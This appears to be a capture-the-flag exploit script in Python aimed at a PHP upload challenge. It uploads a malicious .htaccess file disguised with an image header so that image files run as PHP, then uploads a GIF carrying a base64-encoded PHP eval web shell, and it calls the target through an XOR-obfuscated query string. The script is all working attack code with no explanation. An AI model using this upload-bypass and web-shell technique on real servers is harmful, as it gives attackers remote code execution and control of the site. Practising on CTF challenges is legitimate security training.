import requests
import time 

htaccess = b"""
#define width 1337
#define height 1337
AddType application/x-httpd-php .jpg .gif .png
php_value auto_append_file "php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_adeee0c170ad4ffb110df0cde294aecd/cccccccc.gif"
"""


files = {'file':('.htaccess',htaccess,'image/jpeg')}
url = r'http://edf41676-3117-4d25-9759-b1f73ce5e6e1.node3.buuoj.cn/?_=${%a0%b8%ba%ab^%ff%ff%ff%ff}{%ff}();&%ff=get_the_flag'
# data = {''}
r = requests.post(url=url,files=files)
print(r.text)

shell = b"""GIF89a12
PD9waHAgQGV2YWwoJF9QT1NUW25hbWVdKT8+"""
file2 = {'file':('cccccccc.gif',shell,'image/gif')}
r2 = requests.post(url=url,files=file2)
print(r2.text)